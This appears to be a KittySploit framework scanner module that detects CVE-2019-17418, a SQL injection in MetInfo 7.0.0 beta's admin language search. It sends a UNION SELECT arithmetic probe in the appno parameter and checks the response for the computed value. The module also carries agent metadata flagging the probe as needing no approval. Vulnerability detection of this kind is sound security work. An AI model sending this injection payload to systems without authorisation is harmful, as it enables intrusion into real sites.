#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MetInfo 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MetInfo 7.0.0 beta - SQL Injection Detection',
        'description': 'MetInfo 7.0.0 beta is susceptible to SQL injection via the admin/?n=language&c=language_general&a=doSearchParameter appno parameter (a different issue than CVE-2019-16997).',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'metinfo', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/evi1code/Just-for-fun/issues/2',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-17418',
            'https://github.com/0ps/pocassistdb',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2019-17418',
    }

    def run(self):
        r = self.http_request(method="GET", path='/admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+98989*443131,1--+&site=admin', allow_redirects=True)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('43865094559',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="MetInfo 7.0.0 beta - SQL Injection detected",
                path='/admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+98989*443131,1--+&site=admin',
            )
            return True
        return False

